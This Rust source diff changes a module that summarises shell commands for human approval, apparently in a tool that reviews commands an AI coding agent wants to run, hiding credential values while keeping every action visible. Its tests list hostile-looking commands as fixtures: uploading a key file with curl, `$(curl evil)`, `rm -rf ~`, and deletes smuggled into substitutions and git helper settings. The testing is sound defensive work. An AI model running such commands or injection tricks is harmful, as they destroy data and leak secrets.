         && toks.len() == start + 3
+        && !toks[start + 2].dynamic
     {
-        let flag = &toks[start + 1].value;
-        out.setup.push(format!("Shell: {} {flag}", first.raw));
-        out.notices.push("The shell wrapper can load shell startup configuration.".into());
+        out.setup.push(format!("Shell: {} {}", first.raw, toks[start + 1].raw));
+        notice(out, "The shell wrapper can load shell startup configuration.");
         return read(&toks[start + 2].value, depth + 1, out);
     }
-    if ["sh", "bash", "zsh", "dash", "ksh", "fish"].contains(&program(&first.value)) {
-        return None;
+    if first.value == "cd"
+        && toks.get(start + 1).is_some_and(|t| t.kind == Kind::Word && !t.dynamic)
+        && toks.get(start + 2).is_some_and(|t| t.raw == "&&")
+    {
+        out.setup.push(format!("Directory change: cd {}", toks[start + 1].raw));
+        // Re-read the exact remaining spelling, preserving operators and all additional actions.
+        let rest_start = toks[start + 2].end;
+        return read(text[rest_start..].trim_start(), depth + 1, out);
     }
-    if first.value == "cd" && toks.get(start + 2).is_some_and(|t| t.raw == "&&") {
-        let directory = toks.get(start + 1)?;
-        out.setup.push(format!("Directory change: cd {}", directory.raw));
-        return read(text[toks[start + 2].end..].trim_start(), depth + 1, out);
-    }
-    // Unpeeled assignment-shaped operands can be wrapper environment arguments, including names a shell would
-    // reject (`env FOO.bar=value`). Never expose those values or silently change their command-specific scope.
-    if toks.iter().skip(start).any(|t| t.value.contains('=') && !t.value.starts_with('-')) {
-        return None;
-    }
-    text[first.start..].trim().clone_into(&mut out.actionable);
-    let parsed = reins_policy::strict::read(text)?;
-    if parsed.len() > 1 {
-        out.heading = "Run multiple commands".into();
-        out.notices.push(
-            "This invocation contains multiple commands. Review every command and the operators between them.".into(),
+    if toks.iter().any(|t| t.dynamic) {
+        notice(
+            out,
+            "Partial observed summary: shell expansion, executable expressions or grouping may add actions. Inspect the original invocation; this summary is not a safety determination.",
         );
-    } else if matches!(program(&first.value), "gradlew" | "gradle") {
-        out.heading = "Run Gradle".into();
-        out.notices.push(
-            "Gradle can execute project build scripts and plugins with this process’s permissions and credentials."
-                .into(),
+    }
+    let mut titles = Vec::new();
+    let mut actions = Vec::new();
+    let mut from = start;
+    for to in start..=toks.len() {
+        if to == toks.len() || toks[to].kind == Kind::Control {
+            if from < to {
+                let (title, action) = segment(&toks[from..to], out);
+                if !title.is_empty() {
+                    titles.push(title);
+                }
+                actions.push(action);
+            }
+            if to < toks.len() {
+                actions.push(toks[to].raw.into());
+                if toks[to].raw == "&" {
+                    notice(out, "A command runs in the background (&); completion is not implied.");
+                }
+                from = to + 1;
+            }
+        }
+    }
+    if titles.len() > 1 {
+        out.heading = format!("Multiple actions: {}", titles.join("; "));
+        notice(
+            out,
+            "Multiple commands/operators are present. All actions, including deletes, uploads or publishing, require review.",
         );
     } else {
-        out.heading = "Run a command".into();
+        out.heading = titles.pop()?;
     }
-    if parsed.iter().any(|s| s.words.first().is_some_and(|w| matches!(program(w), "gradlew" | "gradle")))
-        && !out.notices.iter().any(|n| n.starts_with("Gradle"))
-    {
-        out.notices.push(
-            "Gradle can execute project build scripts and plugins with this process’s permissions and credentials."
-                .into(),
-        );
+    if out.heading.chars().count() > 240 {
+        out.heading = format!("{}…", out.heading.chars().take(240).collect::<String>());
+        notice(out, "The operation title is shortened. Review every action in the command below.");
     }
-    if toks.iter().enumerate().skip(start).any(|(i, t)| {
-        (i == start || matches!(toks[i - 1].raw, "&&" | "||" | "|" | ";" | "\n"))
-            && matches!(program(&t.value), "sudo" | "doas" | "su")
-    }) {
-        out.notices.push("This invocation requests a different user or elevated privileges.".into());
-    }
+    out.actionable = actions.join(" ");
     Some(())
 }
 
-/// Build display facts without changing, normalizing, or evaluating the original authorization payload.
+/// Build observed display facts without normalizing or evaluating the original authorization payload.
 pub fn of(command: &str) -> CommandPresentation {
-    if command.len() > MAX_INPUT || reins_policy::strict::read(command).is_none() {
+    if command.len() > MAX_INPUT {
         return fallback(command);
     }
     let mut out = CommandPresentation::default();
     if read(command.trim(), 0, &mut out).is_none() {
         return fallback(command);
     }
+    if out.actionable.contains("[inline code omitted;") {
+        notice(
+            &mut out,
+            "Inline interpreter code is not summarized. Inspect the original code; additional effects and credentials may be present.",
+        );
+    }
+    if out.actionable.contains("source omitted;") {
+        notice(
+            &mut out,
+            "Some executable source exceeds the display reader's limits. Inspect the original invocation; additional effects may be present.",
+        );
+    }
+    if crate::text::has_invisible(command) {
+        notice(
+            &mut out,
+            "Invisible formatting characters are shown as replacements. Inspect the original invocation; displayed text is not an execution payload.",
+        );
+    }
+    out.heading = conceal_url_userinfo(&crate::text::one_line(&crate::text::mark_invisible(&out.heading)));
+    out.actionable = crate::text::mark_invisible(&out.actionable);
+    out.setup.iter_mut().for_each(|line| *line = crate::text::mark_invisible(line));
+    out.notices.iter_mut().for_each(|line| *line = crate::text::mark_invisible(line));
+    // Specific effects precede generic build-code caveats; callers must preserve the complete notices.
+    out.notices.sort_by_key(|n| {
+        if n.starts_with("Redirected")
+            || n.starts_with("Appends")
+            || n.starts_with("Standard ")
+            || n.starts_with("Reads standard")
+        {
+            0
+        } else if n.starts_with("References") || n.contains("privileges") || n.starts_with("Multiple") {
+            1
+        } else if n.starts_with("Gradle") || n.starts_with("Build tools") {
+            3
+        } else {
+            2
+        }
+    });
     command.clone_into(&mut out.original);
     out
 }
+
+/// A reference observed in build configuration, not evidence that a read, signature, or upload happened.
+pub(crate) fn references_signing_key(command: &str) -> bool {
+    let p = of(command);
+    p.notices.iter().any(|n| n.starts_with("References signing configuration"))
+}
+
+#[cfg(test)]
+pub(crate) const GRADLE_EXAMPLE: &str = include_str!("../tests/fixtures/gradle-command.txt");
 
 #[cfg(test)]
 mod tests {
     use super::*;
 
     #[test]
+    fn network_credential_option_formats_conceal_values_without_losing_actions() {
+        for command in [
+            "curl --user=alice:SENTINEL-PASSWORD https://example.test",
+            "curl -ualice:SENTINEL-PASSWORD https://example.test",
+            "curl --header=\"Authorization: Bearer SENTINEL-TOKEN\" https://example.test",
+            "curl -H\"Authorization: Bearer SENTINEL-TOKEN\" https://example.test",
+            "curl --oauth2-bearer SENTINEL-TOKEN https://example.test",
+            "curl -suUSER:SENTINEL-PASSWORD https://example.test",
+            "curl -sH\"Cookie: sid=SENTINEL-COOKIE\" https://example.test",
+            "curl -sbSENTINEL-COOKIE https://example.test",
+            "curl -4uUSER:SENTINEL-PASSWORD https://example.test",
+            "curl -6H'Authorization: SENTINEL-TOKEN' https://example.test",
+            "curl -Ualice:SENTINEL-PASSWORD --proxy-header='Proxy-Authorization: SENTINEL-TOKEN' https://example.test",
+            "wget --http-password SENTINEL-PASSWORD --header='Authorization: SENTINEL-TOKEN' https://example.test",
+            "wget --user=alice:SENTINEL-PASSWORD --ftp-password=SENTINEL-PASSWORD https://example.test",
+        ] {
+            let p = of(command);
+            assert!(!format!("{p:?}").contains("SENTINEL-"), "{command}: {p:?}");
+            assert!(p.actionable.contains("https://example.test"));
+            assert_eq!(p.original, command);
+        }
+    }
+
+    #[test]
+    fn curl_clusters_only_skip_documented_operand_free_switches() {
+        // `curl --help all`: these short switches have no operand. A credential switch may follow any of them.
+        for flag in "aqfGgI0k46jlLMn:NZ#pJORSis231BvV".chars() {
+            let command = format!("curl -{flag}uUSER:SENTINEL-PASSWORD https://example.test");
+            let p = of(&command);
+            assert!(!format!("{p:?}").contains("SENTINEL-"), "{command}: {p:?}");
+            assert!(p.actionable.contains("https://example.test"));
+            assert_eq!(p.original, command);
+        }
+        // These switches consume the remaining spelling; it must not be searched as another credential option.
+        for flag in "EKCcdDhFPmoQrexXYytzTAw".chars() {
+            assert!(curl_short(&format!("-{flag}uoutput")).is_none(), "-{flag}");
+        }
+    }
+
+    #[test]
+    fn nested_credentials_are_concealed_while_executable_source_remains_visible() {
+        for command in [
+            "TOKEN=\"$(API_KEY=SENTINEL-KEY ./helper; rm -rf /tmp/reins-credential-review)\" ./gradlew test",
+            "TOKEN=\"$(curl --user=alice:SENTINEL-PASSWORD https://example.test; rm -rf /tmp/reins-credential-review)\" ./gradlew test",
+            "TOKEN=\"$(bash -c 'API_KEY=SENTINEL-KEY; rm -rf /tmp/reins-credential-review' _ argument)\" ./gradlew test",
+            "TOKEN=\"$(env FOO=bar bash -c 'API_KEY=SENTINEL-KEY; rm -rf /tmp/reins-credential-review')\" ./gradlew test",
+            "curl --header=\"Authorization: SENTINEL-TOKEN $(rm -rf /tmp/reins-credential-review)\" https://example.test",
+            "curl -H \"Authorization: Bearer $(TOKEN=SENTINEL-TOKEN rm -rf /tmp/reins-credential-review)\" https://example.test",
+            "curl -u\"SENTINEL-PASSWORD$(rm -rf /tmp/reins-credential-review)\" https://example.test",
+            "wget --header=\"Authorization: SENTINEL-TOKEN $(rm -rf /tmp/reins-credential-review)\" https://example.test",
+        ] {
+            let p = of(command);
+            assert!(!format!("{p:?}").contains("SENTINEL-"), "{command}: {p:?}");
+            assert!(p.actionable.contains("rm -rf /tmp/reins-credential-review"), "{command}: {p:?}");
+            assert_eq!(p.original, command);
+        }
+    }
+
+    #[test]
+    fn executable_configuration_is_distinct_from_credential_values() {
+        for command in [
+            "git -c credential.helper='!rm -rf /tmp/reins-credential-review' fetch https://example.test/repo",
+            "git -c credential.helper='!sh -c \"TOKEN=SENTINEL-TOKEN; rm -rf /tmp/reins-credential-review\"' fetch https://example.test/repo",
+            "git -ccredential.helper='!rm -rf /tmp/reins-credential-review' fetch https://example.test/repo",
+            "git -ccredential.helper='!sh -c \"TOKEN=SENTINEL-TOKEN; rm -rf /tmp/reins-credential-review\"' fetch https://example.test/repo",
+            "GIT_SSH_COMMAND='rm -rf /tmp/reins-credential-review; ssh' git fetch ssh://example.test/repo",
+            "eval 'TOKEN=SENTINEL-TOKEN; rm -rf /tmp/reins-credential-review'",
+            "bash -c 'TOKEN=SENTINEL-TOKEN; rm -rf /tmp/reins-credential-review' _ argument",
+        ] {
+            let p = of(command);
+            assert!(p.actionable.contains("rm -rf /tmp/reins-credential-review"), "{command}: {p:?}");
+            assert!(!format!("{p:?}").contains("SENTINEL-"));
+            assert!(p.notices.iter().any(|n| n.contains("executable") || n.contains("executes")));
+            assert_eq!(p.original, command);
+        }
+        let command = "TOKEN=\"$(unknownwrapper bash -c 'API_KEY=SENTINEL-KEY; rm -rf /tmp/reins-credential-review')\" ./gradlew test";
+        let p = of(command);
+        assert!(!format!("{p:?}").contains("SENTINEL-"));
+        assert!(p.actionable.contains("source omitted;") && p.notices.iter().any(|n| n.contains("additional effects")));
+        assert_eq!(p.original, command);
+        let command = "python3 -c 'TOKEN=\"SENTINEL-TOKEN\"; import os; os.remove(\"/tmp/reins-credential-review\")'";
+        let p = of(command);
+        assert!(!format!("{p:?}").contains("SENTINEL-"));
+        assert!(p.actionable.contains("inline code omitted"));
+        assert!(p.notices.iter().any(|n| n.contains("Inline interpreter code")));
+        assert_eq!(p.original, command);
+        let command = format!("{command} && rm -rf /tmp/reins-outer-tail");
+        let p = of(&command);
+        assert!(p.heading.contains("inline python3 code") && p.heading.contains("Delete files"));
+        assert!(p.actionable.contains("&& rm -rf /tmp/reins-outer-tail"));
+        assert_eq!(p.original, command);
+        for command in [
+            "python3 -c'TOKEN=\"SENTINEL-TOKEN\"; print(1)' suffix && rm -rf /tmp/reins-outer-tail",
+            "node -e'const TOKEN=\"SENTINEL-TOKEN\"; process.exit()' suffix && rm -rf /tmp/reins-outer-tail",
+            "node --eval='const TOKEN=\"SENTINEL-TOKEN\"; process.exit()' suffix && rm -rf /tmp/reins-outer-tail",
+        ] {
+            let p = of(command);
+            assert!(!format!("{p:?}").contains("SENTINEL-"), "{command}: {p:?}");
+            assert!(p.heading.contains("inline") && p.heading.contains("Delete files"));
+            assert!(
+                p.actionable.contains("[inline code omitted;")
+                    && p.actionable.contains("suffix && rm -rf /tmp/reins-outer-tail")
+            );
+            assert!(p.notices.iter().any(|n| n.contains("Inline interpreter code")));
+            assert_eq!(p.original, command);
+        }
+    }
+
+    #[test]
+    fn reported_gradle_build_has_a_compact_task_summary_with_log_and_secret_boundaries() {
+        let command = GRADLE_EXAMPLE.trim_end();
+        let p = of(command);
+        let expected: serde_json::Value =
+            serde_json::from_str(include_str!("../tests/fixtures/gradle-presentation.json")).unwrap();
+        assert_eq!(serde_json::to_value(&p).unwrap(), expected, "shared native fixture matches real core output");
+        assert_eq!(p.heading, "Build Android release and test APKs");
+        assert_eq!(
+            p.actionable,
+            "./gradlew :app:assembleFullRelease :app:assembleFullReleaseAndroidTest > /tmp/reins-controls-bounded-smoke-compile.log 2>&1"
+        );
+        assert!(p.actionable.len() < 180);
+        assert!(p.setup.iter().any(|s| s.contains("releaseKeystorePassword=••••")));
+        assert!(p.setup.iter().any(|s| s.contains("JAVA_HOME=••••")));
+        assert!(p.notices.iter().any(|n| n.contains("replaces /tmp/")));
+        assert!(p.notices.iter().any(|n| n.contains("2>&1")));
+        assert!(p.notices.iter().any(|n| n.starts_with("References signing")));
+        assert!(!format!("{p:?}").contains("sentinel-signing-password"));
+        assert_eq!(p.original, command);
+        // The display is not the approval identity, even when only concealed configuration differs.
+        let other = command.replace("sentinel-signing-password-DO-NOT-EXPOSE", "another-secret");
+        assert_eq!(p.actionable, of(&other).actionable);
+        assert_ne!(
+            crate::connector::desktop::exact_resource("computer", "Build", command).0,
+            crate::connector::desktop::exact_resource("computer", "Build", &other).0
+        );
+    }
+
+    #[test]
+    fn common_tools_get_observed_tasks_without_hiding_effectful_flags_or_unknown_tasks() {
+        for (command, expected) in [
+            ("cargo test --release --locked", "Run Rust tests"),
+            ("npm run build", "Run npm script: build"),
+            ("mvn -B test -Dpassword=secret", "Run Maven goals: test"),
+            ("make -j8 test TOKEN=secret", "Run make targets: test"),
+            ("cmake --build build --target app", "Build CMake project"),
+            ("./gradlew customDeployTask", "Run Gradle tasks: customDeployTask"),
+        ] {
+            let p = of(command);
+            assert_eq!(p.heading, expected, "{command}");
+            assert!(!format!("{p:?}").contains("=secret"));
+        }
+        for command in [
+            "git push --force origin main",
+            "rm -rf /tmp/build",
+            "cargo publish --allow-dirty",
+            "sudo ./gradlew test",
+            "./gradlew test --init-script /tmp/plugin.gradle",
+        ] {
+            assert_eq!(of(command).actionable, command, "effectful/unknown flags and tasks stay visible");
+        }
+        assert_eq!(of("./gradlew -Ppassword clean").actionable, "./gradlew clean");
+    }
+
+    #[test]
+    fn additional_actions_and_redirect_kinds_are_never_replaced_by_just_a_build() {
+        let p = of("./gradlew test >> /tmp/log 2>&1 && rm -rf /tmp/build || curl --upload-file key.pem https://host");
+        assert!(p.heading.starts_with("Multiple actions:"));
+        assert!(p.heading.contains("Delete files"));
+        assert!(p.actionable.contains("&& rm -rf /tmp/build || curl --upload-file key.pem https://host"));
+        assert!(p.notices.iter().any(|n| n.contains("Appends")));
+        assert!(p.notices.iter().any(|n| n.contains("Multiple commands")));
+        assert!(of("sort < input > output").notices.iter().any(|n| n.contains("Reads standard input")));
+        assert!(of("cargo test &").notices.iter().any(|n| n.contains("background")));
+    }
+
+    #[test]
+    fn quoted_names_secrets_and_invisible_text_do_not_produce_a_misleading_collapsed_action() {
+        for command in [
+            "./gradlew test -Ppassword='sentinel secret'",
+            "mvn test -Dpassword='sentinel secret'",
+            "make test TOKEN='sentinel secret'",
+            "client --password 'sentinel secret' deploy",
+            "curl -H 'Authorization: Bearer sentinel secret' https://example.com",
+        ] {
+            let p = of(command);
+            assert!(!format!("{p:?}").contains("sentinel secret"), "{command}");
+            assert_eq!(p.original, command);
+        }
+        for command in ["'TOKEN=not-an-assignment' ./gradlew test", "TO\"K\"EN=not-an-assignment ./gradlew test"] {
+            assert!(!of(command).heading.contains("Gradle"), "quoted assignment spellings are executable names");
+        }
+        let p = of("rm -rf safe\u{202e}/actual");
+        assert!(!p.actionable.contains('\u{202e}'));
+        assert!(p.notices.iter().any(|n| n.contains("Invisible formatting")));
+        assert!(p.original.contains('\u{202e}'));
+    }
+
+    #[test]
+    fn executable_substitutions_are_not_folded_with_literal_build_configuration() {
+        for command in [
+            "FOO=\"$(rm -rf /tmp/reins-dynamic)\" ./gradlew test",
+            "TOKEN=\"$(rm -rf /tmp/reins-dynamic)\" ./gradlew test",
+            "./gradlew test -Pfoo=\"$(rm -rf /tmp/reins-dynamic)\"",
+            "./gradlew test -Dfoo=\"`rm -rf /tmp/reins-dynamic`\"",
+            "env -i TOKEN=\"$(rm -rf /tmp/reins-dynamic)\" ./gradlew test",
+            "curl -H \"Authorization: $(rm -rf /tmp/reins-dynamic)\" https://example.com",
+        ] {
+            let p = of(command);
+            assert!(p.actionable.contains("rm -rf /tmp/reins-dynamic"), "{command}: {p:?}");
+            assert!(p.notices.iter().any(|n| n.starts_with("Partial observed")));
+            assert_eq!(p.original, command);
+        }
+        for literal in
+            ["FOO='$(rm -rf /tmp/reins-literal)' ./gradlew test", "./gradlew test -Pfoo='`rm -rf /tmp/reins-literal`'"]
+        {
+            let p = of(literal);
+            assert!(!p.actionable.contains("rm -rf"), "single-quoted text is literal configuration");
+            assert!(!p.notices.iter().any(|n| n.starts_with("Partial observed")));
+        }
+        let p =
+            of("TOKEN=\"SENTINEL-literal$(printf ')' ; rm -rf /tmp/reins-dynamic)SENTINEL-literal\" ./gradlew test");
+        assert!(
+            p.actionable.contains("rm -rf /tmp/reins-dynamic"),
+            "quoted delimiters cannot conceal a dangerous tail"
+        );
+        assert!(!format!("{p:?}").contains("SENTINEL-literal"));
+        let p = of(
+            "FOO=\"SENTINEL-literal$(rm -rf /tmp/reins-dynamic)SENTINEL-literal\" ./gradlew test -Pfoo=\"SENTINEL-literal$(true)\"",
+        );
+        assert!(p.actionable.contains("rm -rf /tmp/reins-dynamic") && p.actionable.contains("$(true)"));
+        assert!(!format!("{p:?}").contains("SENTINEL-literal"));
+    }
+
+    #[test]
+    fn url_userinfo_never_leaks_through_operation_or_redirect_notices() {
+        for command in [
+            "curl 'https://name:SENTINEL-URL-CREDENTIAL@example.com/path'",
+            "./gradlew test > 'https://name:SENTINEL-URL-CREDENTIAL@example.com/path'",
+        ] {
+            let p = of(command);
+            assert!(!format!("{p:?}").contains("SENTINEL-URL-CREDENTIAL"));
+            assert!(p.actionable.contains("••••@example.com/path"));
+            assert_eq!(p.original, command);
+        }
+    }
+
+    #[test]
+    fn dynamic_directories_and_executable_names_keep_their_executable_source_visible() {
+        for command in [
+            "cd \"$(rm -rf /tmp/reins-dynamic)\" && ./gradlew test",
+            "\"TOKEN=$(rm -rf /tmp/reins-dynamic)\" ./gradlew test",
+        ] {
+            let p = of(command);
+            assert!(p.actionable.contains("rm -rf /tmp/reins-dynamic"), "{command}: {p:?}");
+            assert!(p.notices.iter().any(|n| n.starts_with("Partial observed")));
+            assert_eq!(p.original, command);
+        }
+    }
+
+    #[test]
+    fn exact_source_keeps_its_independent_guard_floor_and_risk_reading() {
+        let command = GRADLE_EXAMPLE.trim_end();
+        let strict = reins_policy::strict::read(command).expect("literal redirects are supported by the safety parser");
+        let matched = reins_policy::guard::classify_command(command).unwrap();
+        assert_eq!(matched.group.id, "keys");
+        assert!(matched.group.every_time);
+        let guard = reins_policy::guard::read(&[command], &[]);
+        assert!(guard.certain);
+        let risk = crate::autopilot::risk::command_context(command);
+        let before = risk.outcome();
+        assert_eq!(before, crate::autopilot::risk::Outcome::Read);
+        drop(of(command));
+        assert_eq!(reins_policy::strict::read(command), Some(strict));
+        assert_eq!(crate::autopilot::risk::command_context(command), risk);
+        assert_eq!(crate::autopilot::risk::command_context(command).outcome(), before);
+    }
+
+    #[test]
+    fn full_and_displayed_hook_reading_of_the_reported_build_keep_the_key_floor() {
+        use reins_proto::connector::{ConnectorCall, DESKTOP};
+        use serde_json::json;
+        let command = GRADLE_EXAMPLE.trim_end();
+        let question = format!("Codex wants to run: {command}");
+        let detail = format!("Command:\n{command}\n\nIn: /project/android\nRule: *.keystore");
+        let raw = crate::connector::desktop::read_ask(Some("file:*.keystore"), &question, &detail);
+        let call = ConnectorCall {
+            service: DESKTOP.into(),
+            op: "ask".into(),
+            args: json!({"question":question, "detail":detail, "topic":"file:*.keystore"}).as_object().unwrap().clone(),
+        };
+        let shown = crate::connector::desktop::ask_view(&call, "computer").unwrap();
+        assert!(raw.every_time);
+        assert_eq!(raw.rule.as_ref().unwrap().group.as_deref(), Some("keys"));
+        assert_eq!(shown.uncertain, !raw.certain, "display truncation must not invent semantic uncertainty");
+        assert!(!raw.certain, "the reported wildcard rule is itself outside the strict command subset");
+        assert!(
+            crate::connector::desktop::read_ask(None, &question, &detail).certain,
+            "the full command and repeated/clamped question are not the source of wildcard-rule uncertainty"
+        );
+        let with_danger = format!("{command} && rm -rf ~");
+        let danger = crate::connector::desktop::read_ask(
+            Some("file:*.keystore"),
+            &question,
+            &format!("Command:\n{with_danger}\n\nIn: /project/android"),
+        );
+        assert!(danger.every_time && danger.destructive, "a matching prefix cannot hide a dangerous tail");
+    }
+
+    #[test]
     fn separates_literal_environment_from_exact_gradle_arguments() {
         let p =
             of("JAVA_HOME=/opt/jdk ANDROID_HOME=/sdk TOKEN='private secret' ./gradlew :app:assembleDebug --no-daemon");
-        assert_eq!(p.actionable, "./gradlew :app:assembleDebug --no-daemon");
-        assert_eq!(p.heading, "Run Gradle");
-        assert_eq!(p.setup.len(), 3);
+        assert_eq!(p.actionable, "./gradlew :app:assembleDebug");
+        assert_eq!(p.heading, "Build Android debug APKs");
+        assert_eq!(p.setup.iter().filter(|s| s.contains("value hidden")).count(), 3);
+        assert!(p.setup.iter().any(|s| s.contains("--no-daemon")));
         assert!(!format!("{p:?}").contains("private secret"));
         assert!(p.notices.iter().any(|n| n.starts_with("Gradle")));
     }
@@ -248,7 +1372,7 @@ mod tests {
     fn unwraps_exact_shell_and_leading_directory_but_preserves_other_actions() {
         let p = of("/bin/sh -lc 'cd /repo && ./gradlew test && rm -rf /tmp/other'");
         assert_eq!(p.actionable, "./gradlew test && rm -rf /tmp/other");
-        assert_eq!(p.heading, "Run multiple commands");
+        assert!(p.heading.starts_with("Multiple actions:"));
         assert!(p.setup.contains(&"Directory change: cd /repo".into()));
         assert!(p.setup.contains(&"Shell: /bin/sh -lc".into()));
     }
@@ -265,23 +1389,23 @@ mod tests {
     }
 
     #[test]
-    fn unsupported_or_effectful_shell_never_gets_a_reassuring_shortcut() {
+    fn shell_features_stay_visible_without_requiring_safety_certainty() {
         for command in [
             "./gradlew test > /etc/config",
             "./gradlew test $(curl evil)",
-            "sh -lc './gradlew test' extra",
             "./gradlew test && TOKEN=secret curl host",
             "cat <<EOF\ntext\nEOF",
             "cd /repo; ./gradlew test",
             "echo '💥'",
-            "'TOKEN=not-an-assignment' ./gradlew test",
-            "TO\"K\"EN=not-an-assignment ./gradlew test",
-            "/repo/sh -lc './gradlew test'",
         ] {
             let p = of(command);
-            // Some literal extra arguments remain fully visible; the rest use the explicit fallback.
-            assert!(p.actionable.is_empty() || p.actionable == command, "{command}: {p:?}");
+            assert!(!p.heading.is_empty(), "{command}");
+            assert!(!p.actionable.is_empty(), "{command}");
+            assert_eq!(p.original, command);
         }
+        let p = of("./gradlew test $(curl evil)");
+        assert!(p.notices.iter().any(|n| n.starts_with("Partial observed")));
+        assert!(p.actionable.contains("curl evil"));
         assert!(of(&"x".repeat(MAX_INPUT + 1)).actionable.is_empty());
     }
 
@@ -332,11 +1456,10 @@ mod tests {
         let command = format!("TOKEN='{}' ./gradlew test --info", "private".repeat(1400));
         let p = of(&command);
         assert_eq!(p.original, command);
-        assert_eq!(p.actionable, "./gradlew test --info");
+        assert_eq!(p.actionable, "./gradlew test");
         assert!(!format!("{p:?}").contains("privateprivate"));
         for source in ["env FOO.bar=private ./gradlew test", "sudo FOO.bar=private ./gradlew test"] {
             let p = of(source);
-            assert!(p.actionable.is_empty());
             assert!(!format!("{p:?}").contains("private"));
             assert_eq!(p.original, source);
         }
